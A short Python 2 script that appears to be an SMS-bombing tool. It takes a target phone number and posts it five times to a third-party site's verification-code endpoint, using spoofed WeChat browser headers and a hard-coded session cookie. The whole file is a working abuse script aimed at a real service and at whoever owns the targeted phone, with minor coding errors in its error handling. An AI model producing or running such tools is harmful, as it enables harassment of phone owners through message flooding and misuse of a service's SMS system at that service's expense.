#!/usr/bin/env python
# coding=utf8
# author=joeyxy83@gmail.com
# create=20150729


import json
import random
import requests
import time
import sys


def sms_send(phone):
    data = {'mobileStr':phone}
    headers = { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    			'Origin': 'http://m.cdms.sjcxhz.com',
    			'X-Requested-With': 'XMLHttpRequest',
    			'Referer':'http://m.cdms.sjcxhz.com/region/region?code=021fbbe4cb86275e93dc81f1ed781a6r&state=STATE',
               'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143 MicroMessenger/6.2.3 NetType/WIFI Language/zh_CN',
        }
    cookies = {'Cookie':'ASP.NET_SessionId=3yjtgq50ces4frjovr4'}
    api_url = 'http://m.cdms.sjcxhz.com//Region/SendMobileCode'
    try:
        req = requests.post(api_url,headers=headers,data = data,cookies = cookies,timeout=3)
    except requests.RequestException as e:
        print "error info:" % e
    try:
        success = json.loads(req.content)['flag']
        msg = json.loads(req.content)['msg']
        if success == 'true':
        	print 'sms send result is:%s,info is:%s' % (success,msg)
        else:
        	print 'sms send result is:%s,info is:%s' % (success,msg)
    except:
        print '[-] send False'




if __name__ == '__main__':
    args = []
    if len(sys.argv) != 2:
        print "usage: %s phone" % sys.argv[0]
        sys.exit(1)
    phone = sys.argv[1]
    for i in range(5):
        time.sleep(1)
        sms_send(phone)






